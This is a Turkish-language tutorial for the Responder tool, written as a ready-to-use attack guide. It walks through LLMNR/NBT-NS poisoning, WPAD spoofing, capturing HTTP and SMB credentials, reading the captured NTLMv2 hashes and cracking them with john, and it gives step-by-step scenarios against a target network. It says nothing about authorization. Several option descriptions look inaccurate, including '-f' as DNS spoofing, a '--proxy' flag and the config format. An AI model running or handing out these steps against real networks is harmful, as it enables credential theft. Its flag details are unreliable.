# Responder Kullanım Kılavuzu

## Giriş
Responder, ağdaki zafiyetleri istismar ederek kimlik bilgilerini ele geçirmek için kullanılan güçlü bir araçtır. Windows ortamlarında kimlik doğrulama protokollerinin (örneğin, LLMNR, NBT-NS, ve WPAD) zafiyetlerinden yararlanır. Bu kılavuz, Responder'ın kurulumunu, kullanımını ve yaygın saldırı senaryolarını ele alır.

---

## Kurulum

### 1. Gereksinimler
- **Desteklenen İşletim Sistemleri:** Linux (tercihen Kali Linux veya Parrot OS)
- **Python:** Python 3.x sürümü gereklidir.

### 2. Kurulum Adımları

#### Kali Linux veya Parrot OS
Responder genellikle bu dağıtımlarda önceden yüklüdür. Kontrol etmek için:
```bash
responder -h
```
Eğer kurulu değilse, GitHub üzerinden indirebilirsiniz:
```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
```

---

## Temel Kullanım

### Komut Yapısı
```bash
sudo responder [-I arayüz] [seçenekler]
```

### Yardım Menüsü
Responder'ın komut ve seçeneklerini görmek için:
```bash
sudo responder -h
```

### Ağ Arayüzü Belirleme
Hedef ağda hangi arayüzü kullanacağınızı belirlemek için:
```bash
sudo responder -I eth0
```
- `-I`: Kullanılacak ağ arayüzünü belirtir.

---

## Özellikler ve Saldırı Modları

### 1. **LLMNR ve NBT-NS Poisoning**
Bu mod, hedef ağdaki yanlış yönlendirilmiş LLMNR ve NetBIOS sorgularını zehirler:
```bash
sudo responder -I eth0
```
- Varsayılan olarak LLMNR, NBT-NS ve MDNS etkinleştirilmiştir.

### 2. **WPAD Spoofing**
WPAD sorgularını yakalamak ve sahte WPAD yanıtları göndermek için:
```bash
sudo responder -I eth0 -w
```
- `-w`: WPAD desteğini etkinleştirir.

### 3. **HTTP ve SMB Kimlik Bilgisi Ele Geçirme**
Responder, HTTP ve SMB üzerinden kimlik bilgilerini yakalayabilir:
```bash
sudo responder -I eth0 -r
```
- `-r`: HTTP ve SMB yeniden yönlendirmesini etkinleştirir.

### 4. **DNS Poisoning**
Responder, sahte DNS yanıtları göndererek saldırganın kontrolündeki sunuculara yönlendirme yapabilir:
```bash
sudo responder -I eth0 -f
```
- `-f`: DNS spoofing özelliğini etkinleştirir.

---

## Log ve Çıktılar
Yakalanan kimlik bilgileri varsayılan olarak `logs/` dizinine kaydedilir. Örnek dosyalar:
- `SMB-NTLMv2-SSP.txt`
- `HTTP-Clear-Text-Passwords.txt`

Yakalanan bilgileri görüntülemek için:
```bash
cat logs/SMB-NTLMv2-SSP.txt
```

---

## Gelişmiş Kullanım

### Responder.conf Dosyası
Responder'ın yapılandırmasını özelleştirmek için `Responder.conf` dosyasını düzenleyebilirsiniz:
```bash
nano Responder.conf
```
Örnek olarak HTTP veya SMB protokolünü devre dışı bırakmak için ilgili satırları `Off` olarak değiştirin:
```
[HTTP]
Off
[SMB]
Off
```

### Yakalanan Hashleri Kırmak
Yakalanan NTLM hashlerini kırmak için `john` veya `hashcat` kullanabilirsiniz:
```bash
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### Proxy Kullanımı
Bir proxy sunucusunu kullanarak sahte yanıtları yeniden yönlendirebilirsiniz:
```bash
sudo responder -I eth0 --proxy
```

---

## İpuçları

### Performans İyileştirme
- Responder'ın yalnızca belirli protokolleri dinlemesini sağlamak için `Responder.conf` dosyasını düzenleyin.
- Düşük trafiğe sahip ağlarda daha etkili sonuçlar almak için aktif tarama araçlarıyla (ör. `nmap`) kombinasyon yapabilirsiniz.

### Zafiyet Kontrolü
Hedef ağda LLMNR ve NBT-NS protokolünün açık olup olmadığını kontrol etmek için `nmap` kullanabilirsiniz:
```bash
nmap -sU -p 5355 <hedef ağ>
nmap -sU -p 137 <hedef ağ>
```

---

## Örnek Senaryolar

### LLMNR Poisoning ile Kimlik Bilgisi Ele Geçirme
1. Responder'ı başlatın:
   ```bash
   sudo responder -I eth0
   ```
2. Hedef ağdaki bir kullanıcı sahte bir paylaşım yoluna erişmeye çalıştığında, kimlik bilgileri `logs/` dizinine kaydedilir.

### WPAD Spoofing ile Proxy Şifrelerini Ele Geçirme
1. WPAD modunu etkinleştirin:
   ```bash
   sudo responder -I eth0 -w
   ```
2. Hedef sistem, sahte WPAD sunucusuna yönlendirilir ve kimlik bilgileri yakalanır.

---

## Sorun Giderme

### "No Traffic Captured" Hatası
1. Ağ arayüzünüzü kontrol edin:
   ```bash
   ifconfig
   ```
2. Responder'ın doğru arayüzde çalıştığından emin olun.

### "Permission Denied" Hatası
- Responder'ı `sudo` yetkisiyle çalıştırdığınızdan emin olun.

---

## Ek Kaynaklar
- [Responder Resmi GitHub](https://github.com/lgandx/Responder)
- [LLMNR ve NBT-NS Saldırıları](https://owasp.org/www-project-vulnerable-web-applications-directory/)
- [Active Directory Zafiyetleri ve Savunma](https://adsecurity.org/)

---

## Katkıda Bulunanlar
Bu kılavuz, Responder kullanımını detaylı bir şekilde ele almak için hazırlanmıştır. Sorularınız veya önerileriniz için iletişime geçmekten çekinmeyin!
